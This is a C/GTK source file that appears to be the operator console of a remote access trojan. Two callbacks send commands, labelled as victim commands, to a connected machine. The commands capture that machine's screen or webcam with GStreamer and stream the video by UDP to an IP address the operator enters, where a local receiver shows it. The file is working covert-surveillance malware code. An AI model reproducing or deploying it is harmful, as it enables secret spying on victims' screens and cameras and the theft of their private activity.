#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>  //gethostbyaddr()

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>

#include <gtk-2.0/gtk/gtk.h>

#include "../includes/callbacks_execute_commands.h"
#include "../includes/constants.h"

GtkWidget *main_win;

const gchar *server_ip;
const gchar *server_port;
uint16_t port;


void cb_watch_remote_desktop(GtkButton *button, gpointer user_data)
{
    GtkWidget *IP_dialog = NULL;
    const gchar *IP = NULL;
    GtkWidget *IP_entry = NULL;

    SOCKET sock = 0;
    SOCKADDR_IN sin;

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    FILE *pipe = NULL;


    int err = 0;
    size_t flag_watch = 13;

    //const gchar *command_victime_temp = "gst-launch-1.0 -v ximagesrc use-damage=false xname=/usr/lib/torcs/torcs-bin ! videoconvert ! videoscale ! video/x-raw,format=I420,width=1440,height=810,framerate=30/1 ! jpegenc ! rtpjpegpay ! udpsink ";

    const gchar *command_victime_temp = "gst-launch-1.0 -v ximagesrc use-damage=false xname=/usr/lib/torcs/torcs-bin ! videoconvert ! videoscale ! video/x-raw,format=I420,width=1440,height=900,framerate=30/1 ! jpegenc ! rtpjpegpay ! udpsink ";

    gchar *final_victime_cmd = NULL;

    size_t len_cmd = strlen(command_victime_temp) + 1;
    size_t len_final_cmd = 0;

    const gchar *command_user = "gst-launch-1.0 udpsrc port=4444 ! application/x-rtp,encoding-name=JPEG,payload=26 ! rtpjpegdepay ! jpegdec ! autovideosink";

    IP = malloc(15 * sizeof(char));
    if(IP == NULL)
    {
        error("malloc() IP", "cb_watch_remote_desktop()");
        exit(-1);
    }

    IP_dialog = gtk_dialog_new_with_buttons("Enter Your IP", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);

    gtk_widget_set_size_request(IP_dialog, 360, 100);

    IP_entry  = gtk_entry_new();

    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(IP_dialog)->vbox), IP_entry, TRUE, FALSE, 0);


    gtk_widget_show_all(GTK_DIALOG(IP_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(IP_dialog)))
    {
    case GTK_RESPONSE_APPLY:
        IP = gtk_entry_get_text(GTK_ENTRY(IP_entry));
        //gtk_widget_destroy(IP_dialog);
        break;

    default:
        gtk_widget_destroy(IP_dialog);
        return;
    }

    final_victime_cmd = malloc(256 * sizeof(char));
    if(final_victime_cmd == NULL)
    {
        error("malloc() final_victim_cmd", "cb_watch_remote_desktop()");
        exit(-1);
    }

    final_victime_cmd = strncpy(final_victime_cmd, command_victime_temp, len_cmd);
    final_victime_cmd = strcat(final_victime_cmd, "host=");
    final_victime_cmd = strcat(final_victime_cmd, IP);
    final_victime_cmd = strcat(final_victime_cmd, " ");
    final_victime_cmd = strcat(final_victime_cmd, "port=");
    final_victime_cmd = strcat(final_victime_cmd, server_port);

    gtk_widget_destroy(IP_dialog);

    printf("\n\nCommand : %s\n\n", final_victime_cmd);


    //usleep(400);

    len_final_cmd = strlen(final_victime_cmd) + 1;

    port = (uint16_t)atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    memset(&sin, 0, sizeof(sin));
    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET)
    {
        error("socket()", "cb_watch_remote_desktop()");
        exit(-1);
    }

    err = connect(sock, (SOCKADDR*)&sin, sizeof(sin));

    if(err == SOCKET_ERROR)
    {
        error("connect()", "cb_watch_remote_desktop()");
        exit(-1);
    }

    if(send(sock, (char*)&flag_watch, sizeof(flag_watch), 0) == SOCKET_ERROR)
    {
        error("send() flag_watch", "cb_watch_remote_desktop()");
        exit(-1);
    }

    if(send(sock, (char*)&len_final_cmd, sizeof(len_final_cmd), 0) == SOCKET_ERROR)
    {
        error("send() len_final_cmd", "cb_watch_remote_desktop()");
        exit(-1);
    }

    if(send(sock, final_victime_cmd, len_final_cmd, 0) == SOCKET_ERROR)
    {
        error("send() final_victime_cmd", "cb_watch_remote_desktop()");
        exit(-1);
    }

    pipe = popen(command_user, "w");
    if(pipe == NULL)
    {
        error("popen() pipe", "cb_watch_remote_desktop()");
        exit(-1);
    }

    pclose(pipe);

    free(final_victime_cmd);

    shutdown(sock, SHUT_RDWR);

    /* unused parameters */
    (void)button;
    (void)user_data;

    return;
}


void cb_stream_the_webcam(GtkButton *button, gpointer user_data)
{
    GtkWidget *IP_dialog = NULL;
    const gchar *IP = NULL;
    GtkWidget *IP_entry = NULL;

    SOCKET sock = 0;
    SOCKADDR_IN sin;

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    FILE *pipe = NULL;


    int err = 0;
    size_t flag_watch = 12;

    //gst-launch-1.0 -v v4l2src ! videoconvert ! videoscale ! video/x-raw,format=I420,width=1440,height=900,framerate=30/1 ! jpegenc ! rtpjpegpay ! udpsink host=192.168.1.36 port=4444

    const gchar *command_victime_temp = "gst-launch-1.0 -v v4l2src ! videoconvert ! videoscale ! video/x-raw,format=I420,width=960,height=600,framerate=30/1 ! jpegenc ! rtpjpegpay ! udpsink ";

    gchar *final_victime_cmd = NULL;

    size_t len_cmd = strlen(command_victime_temp) + 1;
    size_t len_final_cmd = 0;

    const gchar *command_user = "gst-launch-1.0 udpsrc port=4444 ! application/x-rtp,encoding-name=JPEG,payload=26 ! rtpjpegdepay ! jpegdec ! autovideosink";

    IP = malloc(15 * sizeof(char));
    if(IP == NULL)
    {
        error("malloc() IP", "cb_stream_the_webcam()");
        exit(-1);
    }

    IP_dialog = gtk_dialog_new_with_buttons("Enter Your IP", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);

    gtk_widget_set_size_request(IP_dialog, 360, 100);

    IP_entry  = gtk_entry_new();

    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(IP_dialog)->vbox), IP_entry, TRUE, FALSE, 0);


    gtk_widget_show_all(GTK_DIALOG(IP_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(IP_dialog)))
    {
    case GTK_RESPONSE_APPLY:
        IP = gtk_entry_get_text(GTK_ENTRY(IP_entry));
        //gtk_widget_destroy(IP_dialog);
        break;

    default:
        gtk_widget_destroy(IP_dialog);
        return;
    }

    final_victime_cmd = malloc(256 * sizeof(char));
    if(final_victime_cmd == NULL)
    {
        error("malloc() final_victim_cmd", "cb_stream_the_webcam()");
        exit(-1);
    }

    final_victime_cmd = strncpy(final_victime_cmd, command_victime_temp, len_cmd);
    final_victime_cmd = strcat(final_victime_cmd, "host=");
    final_victime_cmd = strcat(final_victime_cmd, IP);
    final_victime_cmd = strcat(final_victime_cmd, " ");
    final_victime_cmd = strcat(final_victime_cmd, "port=");
    final_victime_cmd = strcat(final_victime_cmd, server_port);

    gtk_widget_destroy(IP_dialog);

    printf("\n\nCommand : %s\n\n", final_victime_cmd);


    //usleep(400);

    len_final_cmd = strlen(final_victime_cmd) + 1;

    port = (uint16_t)atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    memset(&sin, 0, sizeof(sin));
    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET)
    {
        error("socket()", "cb_stream_the_webcam()");
        exit(-1);
    }

    err = connect(sock, (SOCKADDR*)&sin, sizeof(sin));

    if(err == SOCKET_ERROR)
    {
        error("connect()", "cb_stream_the_webcam()");
        exit(-1);
    }

    if(send(sock, (char*)&flag_watch, sizeof(flag_watch), 0) == SOCKET_ERROR)
    {
        error("send() flag_watch", "cb_stream_the_webcam()");
        exit(-1);
    }

    pipe = popen(command_user, "w");
    if(pipe == NULL)
    {
        error("popen() pipe", "cb_stream_the_webcam()");
        exit(-1);
    }

    if(send(sock, (char*)&len_final_cmd, sizeof(len_final_cmd), 0) == SOCKET_ERROR)
    {
        error("send() len_final_cmd", "cb_stream_the_webcam()");
        exit(-1);
    }

    if(send(sock, final_victime_cmd, len_final_cmd, 0) == SOCKET_ERROR)
    {
        error("send() final_victime_cmd", "cb_stream_the_webcam()");
        exit(-1);
    }

    pclose(pipe);

    free(final_victime_cmd);

    /* unused parameters */
    (void)button;
    (void)user_data;

    return;
}
